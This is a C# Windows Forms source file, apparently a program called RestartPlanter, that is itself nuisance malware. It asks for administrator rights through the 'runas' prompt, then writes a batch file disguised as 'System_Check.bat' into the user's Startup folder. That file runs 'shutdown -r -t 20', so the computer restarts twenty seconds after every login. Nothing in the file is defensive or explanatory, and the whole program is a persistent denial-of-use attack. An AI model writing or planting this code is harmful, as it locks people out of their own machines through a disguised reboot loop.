using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RestartPlanter
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void frmMain_Load(object sender, EventArgs e)
        {

            if (IsAdministrator() == true)
            {
                var TargetPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                using (StreamWriter RestartBat = new StreamWriter(Path.Combine(TargetPath, "System_Check.bat")))
                {
                    RestartBat.WriteLine("@echo off");
                    RestartBat.Write("shutdown -r -t 20");
                }
                
            }
            else
            {


                ProcessStartInfo proc = new ProcessStartInfo();

                proc.UseShellExecute = true;

                proc.WorkingDirectory = Environment.CurrentDirectory;

                proc.FileName = Application.ExecutablePath;

                proc.Verb = "runas";



                try

                {

                    Process.Start(proc);

                }

                catch

                {

                    // The user refused the elevation.

                    // Do nothing and return directly ...

                    Application.Exit();

                }

                Application.Exit();  // Quit itself

            }
        }
    }
}
